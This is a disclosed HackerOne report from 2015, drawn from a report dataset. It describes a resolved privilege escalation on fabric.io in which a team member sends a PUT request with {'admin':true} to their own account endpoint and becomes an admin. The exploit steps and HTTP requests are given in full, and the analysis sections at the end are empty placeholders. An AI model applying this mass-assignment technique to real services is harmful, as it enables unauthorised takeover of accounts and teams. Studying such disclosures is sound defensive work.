---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '42961'
original_report_id: '42961'
title: fabric.io - app member can make himself an admin
weakness: Privilege Escalation
team_handle: x
created_at: '2015-01-08T14:46:02.986Z'
disclosed_at: '2015-03-09T02:30:42.041Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- privilege-escalation
---

# fabric.io - app member can make himself an admin

## Metadata

- HackerOne Report ID: 42961
- Weakness: Privilege Escalation
- Program: x
- Disclosed At: 2015-03-09T02:30:42.041Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Let say, Alice is a member of TestApp.

-> Log into fabric.io as Alice and navigate to settings.
-> Click on Apps and choose TestApp.
-> Click on team members link and notice that Alice role is Member. 

Clicking on team members link sends a similar request as shown below. 

GET /api/v2/organizations/[orgid]/apps/[appid]/team_members HTTP/1.1
Host: fabric.io
...

Response to the above request displays the Alice id as shown below.
..{"name":"alice","email":"alice@mailinator.com","id":"54aa4ab19ea6961359001260","is_activated":true,"is_admin":false}]

-> Use the alice id and send the below shown PUT request.

PUT /accounts/54aa4ab19ea6961359001260 HTTP/1.1
Host: fabric.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=UTF-8
X-CSRF-Token: ...
X-CRASHLYTICS-DEVELOPER-TOKEN: ...
X-Requested-With: XMLHttpRequest
Referer: https://fabric.io/settings/apps/54ad5e03a25bb8136b000002/team_members
Cookie: _fabric_session=...
Connection: keep-alive
Content-Length: 17

{"admin":true}

 Note: In the above request Content-Type: application/json; charset=UTF-8 is mandatory. 

-> It changes the Alice role to Admin.
-> Refresh the browser and navigate to TestApp team members. You will notice Alice role is Admin. Now, Alice can change/delete all other users in the team.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
